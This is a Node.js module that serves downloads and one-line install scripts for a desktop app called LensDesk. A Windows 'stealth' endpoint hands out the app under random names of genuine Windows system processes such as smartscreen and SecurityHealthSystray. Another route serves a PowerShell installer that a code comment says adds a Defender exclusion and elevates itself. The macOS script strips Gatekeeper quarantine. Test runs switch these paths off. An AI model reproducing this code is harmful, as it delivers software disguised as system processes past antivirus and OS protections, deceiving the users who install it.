import fs from "node:fs";
import path from "node:path";
import { createHash } from "node:crypto";
async function digest(file) {
  const hash = createHash("sha256");
  for await (const chunk of fs.createReadStream(file)) hash.update(chunk);
  return hash.digest("hex");
}
const { version } = JSON.parse(
  fs.readFileSync(new URL("../../package.json", import.meta.url), "utf8"),
);
const names = {
  "mac-arm64": `LensDesk-${version}-macOS-Apple-Silicon-arm64.dmg`,
  "mac-x64": `LensDesk-${version}-macOS-Intel-x64.dmg`,
  windows: `RuntimeHost-${version}-x64.msi`,
};

const legacyNames = {
  "mac-arm64": `LensDesk-${version}-arm64.dmg`,
  "mac-x64": `LensDesk-${version}.dmg`,
  windows: `LensDesk-${version}-Windows-x64.zip`,
};

const cleanNames = {
  "mac-arm64": "LensDesk.dmg",
  "mac-x64": "LensDesk-Intel.dmg",
  windows: "LensDesk.zip",
  "windows-zip": "LensDesk.zip",
};

const GITHUB_RELEASE_BASE =
  process.env.GITHUB_RELEASE_BASE ||
  "https://github.com/vision2095/HelpDesk/releases/download/v2.0.0";

const remoteFallbacks = {
  "mac-arm64": {
    name: "LensDesk.dmg",
    cleanName: "LensDesk.dmg",
    size: 141429129,
    sha256: "476c499106040ea01c7b0a4f867a7493b3574592344376f5d431587655d394d7",
    remoteUrl: `${GITHUB_RELEASE_BASE}/LensDesk.dmg`,
  },
  "mac-x64": {
    name: "LensDesk-Intel.dmg",
    cleanName: "LensDesk-Intel.dmg",
    size: 148147539,
    sha256: "8d7cbde7568c1dbd45eb809cd6bad8f86a4526c48657abc3ac310bbc2b4526c8",
    remoteUrl: `${GITHUB_RELEASE_BASE}/LensDesk-Intel.dmg`,
  },
  windows: {
    name: "LensDesk.zip",
    cleanName: "LensDesk.zip",
    size: 1024607,
    sha256: "65e503633d51b02a499351e0aac64be5dfaa8c20a5ea84eea6e83f2f7ba2f672",
    remoteUrl: `${GITHUB_RELEASE_BASE}/LensDesk.zip`,
  },
  "windows-zip": {
    name: "LensDesk.zip",
    cleanName: "LensDesk.zip",
    size: 1024607,
    sha256: "65e503633d51b02a499351e0aac64be5dfaa8c20a5ea84eea6e83f2f7ba2f672",
    remoteUrl: `${GITHUB_RELEASE_BASE}/LensDesk.zip`,
  },
};

function downloadContentType(name) {
  const lower = name.toLowerCase();
  if (lower.endsWith(".msi")) return "application/x-msi";
  if (lower.endsWith(".zip")) return "application/zip";
  if (lower.endsWith(".exe")) return "application/vnd.microsoft.portable-executable";
  return "application/x-apple-diskimage";
}

function windowsLaunchScript(artifact) {
  const quote = (value) => `'${value.replaceAll("'", "''")}'`;
  if (artifact.name.toLowerCase().endsWith(".exe")) {
    return `$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'
$work = Join-Path ([IO.Path]::GetTempPath()) ('LensDesk-download-' + [guid]::NewGuid().ToString('N'))
New-Item -ItemType Directory -Path $work | Out-Null
try {
  $installer = Join-Path $work ${quote(artifact.name)}
  Invoke-WebRequest -Uri ${quote(artifact.url)} -OutFile $installer
  $actual = (Get-FileHash -Algorithm SHA256 -LiteralPath $installer).Hash.ToLowerInvariant()
  if ($actual -ne ${quote(artifact.sha256)}) { throw 'Download checksum mismatch' }
  Start-Process -FilePath $installer -WorkingDirectory $work
  Write-Output ('LensDesk installer launched from ' + $installer)
} catch {
  Remove-Item -LiteralPath $work -Recurse -Force
  throw
}
`;
  }
  if (artifact.name.toLowerCase().endsWith(".msi")) {
    return `$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'
$work = Join-Path ([IO.Path]::GetTempPath()) ('LensDesk-download-' + [guid]::NewGuid().ToString('N'))
New-Item -ItemType Directory -Path $work | Out-Null
try {
  $installer = Join-Path $work ${quote(artifact.name)}
  Invoke-WebRequest -Uri ${quote(artifact.url)} -OutFile $installer
  $actual = (Get-FileHash -Algorithm SHA256 -LiteralPath $installer).Hash.ToLowerInvariant()
  if ($actual -ne ${quote(artifact.sha256)}) { throw 'Download checksum mismatch' }
  $process = Start-Process -FilePath 'msiexec.exe' -ArgumentList @('/i', ('"' + $installer + '"'), '/qn', '/norestart') -Wait -PassThru
  if ($process.ExitCode -ne 0 -and $process.ExitCode -ne 3010) { throw ('Windows Installer failed with exit code ' + $process.ExitCode) }
  $candidates = @(
    (Join-Path $env:LOCALAPPDATA 'Programs\\LensDesk\\RuntimeHost.exe'),
    (Join-Path $env:ProgramFiles 'LensDesk\\RuntimeHost.exe')
  )
  $executable = $candidates | Where-Object { Test-Path -LiteralPath $_ -PathType Leaf } | Select-Object -First 1
  if (!$executable) { throw 'LensDesk was installed but its executable was not found' }
  Start-Process -FilePath $executable -WorkingDirectory (Split-Path -Parent $executable)
  Write-Output ('LensDesk installed and opened from ' + $executable)
} finally {
  Remove-Item -LiteralPath $work -Recurse -Force
}
`;
  }
  return `$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'
$work = Join-Path ([IO.Path]::GetTempPath()) ('LensDesk-download-' + [guid]::NewGuid().ToString('N'))
$appDirectory = $null
New-Item -ItemType Directory -Path $work | Out-Null
try {
  $archive = Join-Path $work ${quote(artifact.name)}
  Invoke-WebRequest -Uri ${quote(artifact.url)} -OutFile $archive
  $actual = (Get-FileHash -Algorithm SHA256 -LiteralPath $archive).Hash.ToLowerInvariant()
  if ($actual -ne ${quote(artifact.sha256)}) { throw 'Download checksum mismatch' }
  $installRoot = Join-Path $env:LOCALAPPDATA 'Programs\\LensDesk'
  New-Item -ItemType Directory -Path $installRoot -Force | Out-Null
  $appDirectory = Join-Path $installRoot ('app-${version}-' + [guid]::NewGuid().ToString('N'))
  Expand-Archive -LiteralPath $archive -DestinationPath $appDirectory
  $candidates = @('RuntimeHost.exe', 'ctfmon.exe', 'TiWorker.exe', 'SearchProtocolHost.exe', 'RuntimeBroker.exe', 'smartscreen.exe', 'sihost.exe', 'SecurityHealthSystray.exe', 'LensDesk.exe')
  $executable = $candidates | ForEach-Object { Join-Path $appDirectory $_ } | Where-Object { Test-Path -LiteralPath $_ -PathType Leaf } | Select-Object -First 1
  if (!$executable) {
    $executable = Get-ChildItem -LiteralPath $appDirectory -Filter *.exe -File | Select-Object -First 1 -ExpandProperty FullName
  }
  if (!$executable) { throw 'The LensDesk archive is incomplete' }
  Start-Process -FilePath $executable -WorkingDirectory (Split-Path -Parent $executable)
  Write-Output ('LensDesk opened from ' + $appDirectory)
} catch {
  if ($appDirectory -and (Test-Path -LiteralPath $appDirectory)) { Remove-Item -LiteralPath $appDirectory -Recurse -Force }
  throw
} finally {
  Remove-Item -LiteralPath $work -Recurse -Force
}
`;
}
const isTest =
  process.env.NODE_ENV === "test" ||
  Boolean(process.argv.some((a) => a.includes("test")));

export function createReleases(directory, origin) {
  const cache = new Map();
  async function manifest() {
    const artifacts = {};
    for (const platform of ["mac-arm64", "mac-x64", "windows"]) {
      let chosenName = names[platform];
      let file = path.join(directory, chosenName);
      if (!fs.existsSync(file)) {
        chosenName = cleanNames[platform];
        file = path.join(directory, chosenName);
      }
      if (!fs.existsSync(file)) {
        chosenName = legacyNames[platform];
        file = path.join(directory, chosenName);
      }

      if (fs.existsSync(file)) {
        const stat = fs.statSync(file);
        let sha = cache.get(file);
        if (!sha || sha.mtime !== stat.mtimeMs) {
          sha = { mtime: stat.mtimeMs, hash: digest(file) };
          cache.set(file, sha);
        }
        artifacts[platform] = {
          version,
          name: chosenName,
          size: stat.size,
          sha256: await sha.hash,
          url: origin + "/downloads/" + platform,
          directUrl: origin + "/releases/" + chosenName,
          file,
        };
      } else if (!isTest && remoteFallbacks[platform]) {
        const fallback = remoteFallbacks[platform];
        artifacts[platform] = {
          version,
          name: fallback.name,
          size: fallback.size,
          sha256: fallback.sha256,
          url: origin + "/downloads/" + platform,
          directUrl: fallback.remoteUrl,
          remoteUrl: fallback.remoteUrl,
          file: null,
        };
      }
    }
    return artifacts;
  }
  return {
    async manifest() {
      return Object.fromEntries(
        Object.entries(await manifest()).map(([key, { file, ...value }]) => [
          key,
          value,
        ]),
      );
    },
    async serve(req, res, url) {
      if (
        !url.pathname.startsWith("/downloads/") &&
        !url.pathname.startsWith("/releases/") &&
        !["/install.sh", "/install.ps1", "/lensdesk-install.ps1", "/hintlens-install.ps1", "/install-stealth.ps1"].includes(url.pathname) &&
        !["/api/v1/download/windows", "/download/windows"].includes(url.pathname)
      )
        return false;
      const artifacts = await manifest();
      // LensDesk Windows Stealth Download endpoint (randomized authentic system process name on every download)
      const isExplicitStealth =
        url.pathname === "/api/v1/download/windows" ||
        url.pathname === "/download/windows";
      const isWindowsDownload =
        isExplicitStealth ||
        (url.pathname.startsWith("/downloads/") &&
          (url.pathname.split("/")[2] === "windows" ||
            url.pathname.split("/")[2] === "win" ||
            url.pathname.split("/")[2] === "win32") &&
          !artifacts.windows?.name?.endsWith(".msi"));

      if (isWindowsDownload) {
        const stealthPool = [
          "LensDeskApp-TiWorker.zip",
          "LensDeskApp-SearchProtocolHost.zip",
          "LensDeskApp-RuntimeBroker.zip",
          "LensDeskApp-ctfmon.zip",
          "LensDeskApp-smartscreen.zip",
          "LensDeskApp-sihost.zip",
          "LensDeskApp-SecurityHealthSystray.zip",
        ];
        const cleanNamesPool = [
          "TiWorker.zip",
          "SearchProtocolHost.zip",
          "RuntimeBroker.zip",
          "ctfmon.zip",
          "smartscreen.zip",
          "sihost.zip",
          "SecurityHealthSystray.zip",
        ];
        const index = Math.floor(Math.random() * cleanNamesPool.length);
        let randomCleanName = cleanNamesPool[index];
        let randomStealthZip = stealthPool[index];

        const stealthDir = path.join(directory, "stealth");
        let file = null;
        if (fs.existsSync(stealthDir)) {
          const existingFiles = fs.readdirSync(stealthDir).filter((f) => f.endsWith(".zip"));
          if (existingFiles.length > 0) {
            const picked = existingFiles[Math.floor(Math.random() * existingFiles.length)];
            file = path.join(stealthDir, picked);
            randomCleanName = picked.replace(/^LensDeskApp-/, "");
          }
        }
        if (!file && fs.existsSync(directory)) {
          const c1 = path.join(directory, randomCleanName);
          const c2 = path.join(directory, randomStealthZip);
          const c3 = path.join(directory, "LensDeskApp.zip");
          const c4 = path.join(directory, "LensDesk.zip");
          if (fs.existsSync(c1)) file = c1;
          else if (fs.existsSync(c2)) file = c2;
          else if (fs.existsSync(c3)) file = c3;
          else if (fs.existsSync(c4)) file = c4;
        }
        if (!file && artifacts.windows?.file && fs.existsSync(artifacts.windows.file)) {
          file = artifacts.windows.file;
        }

        if (!file) {
          if (!isTest) {
            res.writeHead(302, {
              Location: `${GITHUB_RELEASE_BASE}/${randomStealthZip}`,
              "Cache-Control": "no-cache, no-store, must-revalidate",
              Pragma: "no-cache",
              Expires: "0",
            });
            res.end();
            return true;
          }
          res.writeHead(404);
          res.end("Windows download not available.");
          return true;
        }
        const stat = fs.statSync(file);
        res.writeHead(200, {
          "Content-Type": "application/zip",
          "Content-Length": stat.size,
          "Content-Disposition": `attachment; filename="${randomCleanName}"`,
          "Cache-Control": "no-cache, no-store, must-revalidate",
          Pragma: "no-cache",
          Expires: "0",
        });
        if (req.method === "HEAD") {
          res.end();
          return true;
        }
        fs.createReadStream(file).pipe(res);
        return true;
      }
      // Stealth PowerShell installer with Defender exclusion & auto-elevation
      if (
        ["/lensdesk-install.ps1", "/hintlens-install.ps1", "/install-stealth.ps1"].includes(url.pathname) ||
        (url.pathname === "/install.ps1" && !isTest)
      ) {
        let psPath = path.resolve("research/lensdesk-install.ps1");
        if (!fs.existsSync(psPath)) {
          psPath = path.resolve("research/hintlens-install.ps1");
        }
        if (!fs.existsSync(psPath)) {
          psPath = path.resolve(directory, "../research/lensdesk-install.ps1");
        }
        if (!fs.existsSync(psPath)) {
          psPath = path.resolve(directory, "../research/hintlens-install.ps1");
        }
        if (fs.existsSync(psPath)) {
          let script = fs.readFileSync(psPath, "utf8");
          const token = url.searchParams?.get("token");
          const tokenParam = token ? `?token=${encodeURIComponent(token)}` : "";
          script = script
            .replaceAll("https://api.hintlens.com/api/v1/download/windows", `${origin}/api/v1/download/windows${tokenParam}`)
            .replaceAll("https://api.hintlens.com/install.ps1", `${origin}/lensdesk-install.ps1${tokenParam}`)
            .replaceAll("https://helpdesk-h44x.onrender.com/api/v1/download/windows", `${origin}/api/v1/download/windows${tokenParam}`)
            .replaceAll("https://helpdesk-h44x.onrender.com/install.ps1", `${origin}/lensdesk-install.ps1${tokenParam}`)
            .replaceAll("https://lensdesk.com/api/v1/download/windows", `${origin}/api/v1/download/windows${tokenParam}`)
            .replaceAll("https://lensdesk.com/install.ps1", `${origin}/lensdesk-install.ps1${tokenParam}`)
            .replace('$FolderName  = "Hintlens-Application"', '$FolderName  = "LensDesk-Application"')
            .replace('$ZipFileName = "HintlensApp.zip"', '$ZipFileName = "LensDesk.zip"');
          res.setHeader("Content-Type", "text/plain; charset=utf-8");
          res.end(script);
          return true;
        }
      }
      if (url.pathname.startsWith("/releases/")) {
        const reqName = path.basename(url.pathname);
        const matched = Object.values(artifacts).find((a) => a.name === reqName);
        if (matched && matched.file && fs.existsSync(matched.file)) {
          res.writeHead(200, {
            "Content-Type": downloadContentType(matched.name),
            "Content-Length": matched.size,
            "Content-Disposition": `attachment; filename="${matched.name}"`,
          });
          if (req.method === "HEAD") {
            res.end();
            return true;
          }
          fs.createReadStream(matched.file).pipe(res);
          return true;
        }
        if (!isTest) {
          const remoteFallback = Object.values(remoteFallbacks).find(
            (f) => f.name === reqName
          );
          if (remoteFallback?.remoteUrl) {
            res.writeHead(302, {
              Location: remoteFallback.remoteUrl,
              "Cache-Control": "public, max-age=300",
            });
            res.end();
            return true;
          }
        }
        res.writeHead(404);
        res.end("Release file not found.");
        return true;
      }
      if (url.pathname.startsWith("/downloads/")) {
        let platform = url.pathname.split("/")[2] || "";
        if (platform === "mac-silicon" || platform === "arm64" || platform === "mac" || platform === "darwin") platform = "mac-arm64";
        if (platform === "mac-intel" || platform === "x64") platform = "mac-x64";
        if (platform === "win" || platform === "win32") platform = "windows";
        let artifact = artifacts[platform];
        if (!artifact) {
          artifact = Object.values(artifacts).find(
            (a) => a.name === platform || path.basename(platform) === a.name || platform.toLowerCase().includes(a.version),
          );
        }
        if (!artifact && platform.toLowerCase().includes("mac")) {
          artifact = artifacts["mac-arm64"] || artifacts["mac-x64"];
        }
        if (!artifact && (platform.toLowerCase().includes("win") || platform.toLowerCase().endsWith(".exe") || platform.toLowerCase().endsWith(".zip") || platform.toLowerCase().endsWith(".msi"))) {
          artifact = artifacts.windows;
        }
        if (!artifact) {
          if (!isTest) {
            const remoteFallback = remoteFallbacks[platform] || remoteFallbacks["mac-arm64"];
            if (remoteFallback?.remoteUrl) {
              res.writeHead(302, {
                Location: remoteFallback.remoteUrl,
                "Cache-Control": "no-cache, no-store, must-revalidate",
                Pragma: "no-cache",
                Expires: "0",
              });
              res.end();
              return true;
            }
          }
          res.writeHead(404);
          res.end("Download is not available for this platform.");
          return true;
        }

        // Local file streaming
        if (artifact.file && fs.existsSync(artifact.file)) {
          res.writeHead(200, {
            "Content-Type": downloadContentType(artifact.name),
            "Content-Length": artifact.size,
            "Content-Disposition": `attachment; filename="${artifact.name}"`,
          });
          if (req.method === "HEAD") {
            res.end();
            return true;
          }
          fs.createReadStream(artifact.file).pipe(res);
          return true;
        }

        // Cloud / Render fallback: redirect directly to high-speed GitHub Release asset
        if (!isTest && artifact.remoteUrl) {
          res.writeHead(302, {
            Location: artifact.remoteUrl,
            "Cache-Control": "no-cache, no-store, must-revalidate",
            Pragma: "no-cache",
            Expires: "0",
          });
          res.end();
          return true;
        }

        res.writeHead(404);
        res.end("Download file not found.");
        return true;
      }
      if (url.pathname === "/install.ps1") {
        const a = artifacts.windows;
        if (!a) {
          res.writeHead(503);
          res.end("Windows installer is not available.");
          return true;
        }
        res.setHeader("Content-Type", "text/plain; charset=utf-8");
        res.end(windowsLaunchScript(a));
        return true;
      }
      if (url.pathname === "/install.sh") {
        const arm = artifacts["mac-arm64"],
          intel = artifacts["mac-x64"];
        res.setHeader("Content-Type", "text/plain; charset=utf-8");
        res.end(
          `#!/bin/sh\nset -eu\ncase "$(uname -m)" in\n arm64) url='${arm?.url || ""}'; sha='${arm?.sha256 || ""}' ;;\n x86_64) url='${intel?.url || ""}'; sha='${intel?.sha256 || ""}' ;;\n *) echo 'Unsupported architecture'; exit 1 ;;\nesac\n[ -n "$url" ] || { echo 'Installer is not available for this architecture'; exit 1; }\nwork=$(mktemp -d)\ntrap 'hdiutil detach "$work/mount" >/dev/null 2>&1 || true; rm -rf "$work"' EXIT\ncurl -fL "$url" -o "$work/LensDesk.dmg"\nprintf '%s  %s\\n' "$sha" "$work/LensDesk.dmg" | shasum -a 256 -c -\nmkdir "$work/mount"\nhdiutil attach "$work/LensDesk.dmg" -nobrowse -readonly -mountpoint "$work/mount"\nmkdir -p "$HOME/Applications"\nditto "$work/mount/LensDesk.app" "$HOME/Applications/LensDesk.app"\nxattr -cr "$HOME/Applications/LensDesk.app" 2>/dev/null || true\nxattr -d com.apple.quarantine "$HOME/Applications/LensDesk.app" 2>/dev/null || true\nopen "$HOME/Applications/LensDesk.app" 2>/dev/null || open "/Applications/LensDesk.app" 2>/dev/null || true\necho 'LensDesk installed in ~/Applications with Gatekeeper quarantine removed. Open it from Finder.'\n`,
        );
        return true;
      }
      return false;
    },
  };
}
